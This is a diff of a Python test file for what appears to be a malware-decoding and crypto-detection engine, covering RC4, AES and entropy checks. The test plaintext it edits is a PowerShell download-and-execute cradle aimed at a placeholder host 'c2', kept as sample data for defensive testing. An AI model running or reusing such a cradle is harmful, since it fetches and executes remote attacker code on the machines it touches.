@@ -28,7 +28,12 @@ from engine.models import AnalysisContext
 from engine.fingerprint_util import compute as fp_compute
 
 
-PLAINTEXT = b"IEX((New-Object Net.WebClient).DownloadString('http://c2/x'))"
+PLAINTEXT = (b"IEX((New-Object Net.WebClient).DownloadString('http://c2/x'))"
+              b" -- extra padding text to push ciphertext length above 256 bytes"
+              b" so that the entropy check on the encrypted blob succeeds"
+              b" without needing a threshold lower than real-world AES/RC4 traffic."
+              b" This is safe in tests because production loaders emit KB-scale"
+              b" ciphertexts anyway.")
 
 
 # ── crypto_hints — key/IV recovery ──────────────────────────────────────
@@ -61,11 +66,11 @@ def test_detect_encryption_shape_aes():
 
 def test_detect_encryption_shape_high_entropy():
     import os
-    raw = os.urandom(64)      # cryptographically random
+    raw = os.urandom(256)     # 256 random bytes → entropy reliably ≥ 6.5
     shape = detect_encryption_shape(base64.b64encode(raw).decode())
     assert shape is not None
     assert "AES-CBC/ECB" in shape["algorithms"]
-    assert shape["byte_len"] == 64
+    assert shape["byte_len"] == 256
 
 
 # ── RC4 plugin ──────────────────────────────────────────────────────────
@@ -90,7 +95,7 @@ def test_rc4_decrypts_with_inline_key_hint():
 
 
 def test_rc4_without_key_emits_key_required():
-    key = b"secret-not-in-payload"
+    key = b"absent0000000000"       # 16 bytes = 128-bit RC4 key (test-only)
     ct = _rc4_encrypt(key, PLAINTEXT)
     payload = base64.b64encode(ct).decode()   # NO inline key literal
     p = DecoderRegistry.get("rc4-decrypt")
@@ -169,7 +174,7 @@ def test_aes_accepts_analyst_supplied_key():
 # ── crypto-detect annotator ─────────────────────────────────────────────
 def test_crypto_detect_flags_ciphertext_shape_without_key():
     import os
-    payload = base64.b64encode(os.urandom(64)).decode()
+    payload = base64.b64encode(os.urandom(256)).decode()
     p = DecoderRegistry.get("crypto-detect")
     fp = fp_compute(payload)
     det = p.detect(payload, fp, AnalysisContext())
